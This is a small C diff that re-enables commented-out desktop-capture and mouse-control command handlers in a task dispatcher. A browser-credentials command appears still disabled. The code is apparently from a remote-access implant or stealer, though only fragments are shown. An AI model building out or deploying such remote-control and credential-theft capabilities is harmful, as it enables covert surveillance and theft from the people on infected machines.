@@ -505,7 +505,6 @@ int dispatcher_execute(task_t *task, task_result_t *result) {
     }
     break;
 
-/*
   case CMD_DESKTOP_CAPTURE:
     {
       int quality = 50; // Défaut
@@ -527,9 +526,7 @@ int dispatcher_execute(task_t *task, task_result_t *result) {
       result->output_len = result->output ? strlen(result->output) : 0;
     }
     break;
-*/
 
-/*
   case CMD_DESKTOP_MOUSE:
     {
       // Format args: "x,y,flags"
@@ -567,7 +564,6 @@ int dispatcher_execute(task_t *task, task_result_t *result) {
       result->output_len = result->output ? strlen(result->output) : 0;
     }
     break;
-*/
 
 /*
   case CMD_BROWSER_CREDS:
